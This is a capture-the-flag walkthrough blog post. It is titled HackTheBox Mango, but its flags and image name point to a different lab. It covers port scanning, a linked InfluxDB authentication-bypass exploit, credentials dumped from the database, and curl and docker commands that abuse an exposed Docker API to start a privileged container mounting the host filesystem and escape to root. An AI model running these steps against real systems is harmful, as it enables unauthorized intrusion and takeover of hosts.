---
layout: post
title:  "HackTheBox - Mango"
date:   2021-07-29 17:06:25
categories: Pentesting
---

# ENUMERATION
```
PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          32881/udp   status
|   100024  1          37287/udp6  status
|   100024  1          37870/tcp   status
|_  100024  1          60279/tcp6  status
2222/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
8086/tcp open  http    InfluxDB http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# GITHUB EXPLOIT
https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

# SSH CREDS FROM CREDS TABLE IN INFLUX DB
```
[creds] Insert query (exit to change db): select * from ssh
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "pw",
                        "user"
                    ],
                    "name": "ssh",
                    "values": [
                        [
                            "2021-05-16T12:00:00Z",
                            7788764472,
                            "uzJk6Ry98d8C"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

# PORT FORWARDING THE 8080 PORT
```
ssh -L 3000:127.0.0.1:8080 uzJk6Ry98d8C@10.10.72.25 -p 2222
uzJk6Ry98d8C@10.10.72.25's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 25 11:10:26 2021 from ip-10-9-1-81.eu-west-1.compute.internal
```
# DOCKER CREATE NEW CONTAINER WITH ALL PRIVILEGES AND ESCALATE TO ROOT TO ESCAPE
```
curl -XPOST -H "Content-Type: application/json" http://127.0.0.1:3000/containers/create?name=test -d '{"Image":"sweettoothinc", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'

curl -XPOST -H "Content-Type: application/json" http://127.0.0.1:3000/containers/e014d86d79418d88a45e43750ab632b5e316e9c209d58f4a6028f48d54de4da7/start?name=test

docker -H 127.0.0.1:3000 ps

docker -H 127.0.0.1:3000 exec -it <container_id> /bin/bash
```

# DOCKER ROOT
```
┌──(kali㉿MaskdMafia)-[~/Downloads]
└─$ docker -H 127.0.0.1:3000 exec -it f6ca50b159b1 /bin/bash                     1 ⨯
root@f6ca50b159b1:/# whoami
root
root@f6ca50b159b1:/# cat /root/root.txt
THM{5qsDivHdCi2oabwp}
```

# DOCKER ESCAPE

```
docker -H 127.0.0.1:3000 exec -it c162eb284b63 /bin/bash                     1 ⨯
root@c162eb284b63:/# cd /mnt
root@c162eb284b63:/mnt# ls
bin   etc	  initrd.img.old  lost+found  opt   run   sys  var
boot  home	  lib		  media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		  mnt	      root  srv   usr  vmlinuz.old
root@c162eb284b63:/mnt# cd /mnt
root@c162eb284b63:/mnt# ls
bin   etc	  initrd.img.old  lost+found  opt   run   sys  var
boot  home	  lib		  media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		  mnt	      root  srv   usr  vmlinuz.old
root@c162eb284b63:/mnt# cd mnt
root@c162eb284b63:/mnt/mnt# ls
root@c162eb284b63:/mnt/mnt# ls -la
total 8
drwxr-xr-x  2 root root 4096 May 15 11:59 .
drwxr-xr-x 22 root root 4096 May 15 12:37 ..
root@c162eb284b63:/mnt/mnt# cd ..
root@c162eb284b63:/mnt# ls
bin   etc	  initrd.img.old  lost+found  opt   run   sys  var
boot  home	  lib		  media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64		  mnt	      root  srv   usr  vmlinuz.old
root@c162eb284b63:/mnt# cd /root
root@c162eb284b63:/root# cat root.txt
THM{5qsDivHdCi2oabwp}
root@c162eb284b63:/root# cd ..
root@c162eb284b63:/# cd /mnt
root@c162eb284b63:/mnt# cd root
root@c162eb284b63:/mnt/root# ls
root.txt
root@c162eb284b63:/mnt/root# cat root.txt
THM{nY2ZahyFABAmjrnx}
root@c162eb284b63:/mnt/root# exit
exit
```